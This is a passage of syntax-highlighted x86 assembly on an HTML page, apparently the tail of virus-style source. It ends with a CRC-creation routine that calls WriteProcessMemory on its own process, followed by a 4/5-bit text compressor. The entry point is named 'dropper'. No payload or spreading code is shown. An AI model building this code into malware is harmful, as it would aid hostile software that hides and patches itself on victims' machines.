        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;carry set if not zero</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;carry not altered by inc</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">create_outer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">create_loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCurrentProcess</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_crcs</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">compcall</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">compmain</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compress</span><span class="sc0">

</span><span class="sc5">compmain</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">compcall</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">compcall</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;4/5-bit text compressor by RT Fishel, based on algorithm by qkumba in 1986!</span><span class="sc0">
</span><span class="sc1">;compresses A-Z, a-z, 0-9, 3 user characters, lookup table for more characters</span><span class="sc0">
</span><span class="sc1">;fits 66 characters into 5 bits.  qkumba coding makes it possible ;)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">compress</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;al -&gt; src length, esi -&gt; src buffer, edi -&gt; dst buffer</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">comploop</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1bh</span><span class="sc0">                             </span><span class="sc1">;base switch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser123</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser123</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser123</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usertable_e</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usertable</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usertable</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scas</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser5</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;set case before switching base to alphabetic to save 1 bit</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compnumer</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compalpha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;case switch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">compalpha</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">compnumer</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;check if base switch is required</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compextend</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store base switch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">compextend</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">compuser1</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store character</span><span class="sc0">

</span><span class="sc5">comptest</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">comploop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">compuser123</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if base is alphabetic and bytes left and next character is numeric, then</span><span class="sc0">
</span><span class="sc1">;switch base to numeric before storing user char to save 1 bit</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">compchar</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compchar</span><span class="sc0">                        </span><span class="sc1">;no bytes left</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">compchar</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'9'</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">compchar</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store base switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">compchar</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1dh</span><span class="sc0">                             </span><span class="sc1">;user1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;user2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compuser1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;user3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">compuser1</span><span class="sc0">

</span><span class="sc5">compuser5</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if base is numeric, and char is out of numeric range, then switch base to</span><span class="sc0">
</span><span class="sc1">;alphabetic, store char, then restore base unless next char is alphabetic</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">compindex</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">compindex</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store base switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">compindex</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1ch</span><span class="sc0">                             </span><span class="sc1">;user 5 (lookup table)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store character</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">comptest</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">comptest</span><span class="sc0">                        </span><span class="sc1">;no bytes left</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">comprestore</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">comptest</span><span class="sc0">

</span><span class="sc5">comprestore</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compstore</span><span class="sc0">                       </span><span class="sc1">;store base switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comptest</span><span class="sc0">

</span><span class="sc5">compstore</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">compstmask</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">compstmask</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1dh</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;avoid flush for multibyte</span><span class="sc0">

</span><span class="sc5">compstmask</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">compstoreb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">

</span><span class="sc5">compstoreb</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">compsttest</span><span class="sc0">

</span><span class="sc5">compstflush</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">compsttest</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">compstret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">compstflush</span><span class="sc0">                     </span><span class="sc1">;force flush low byte</span><span class="sc0">

</span><span class="sc5">compstret</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">compstore</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">compress</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">             </span><span class="sc5">dropper</span><span class="sc0">
</span></div></body>
</html>
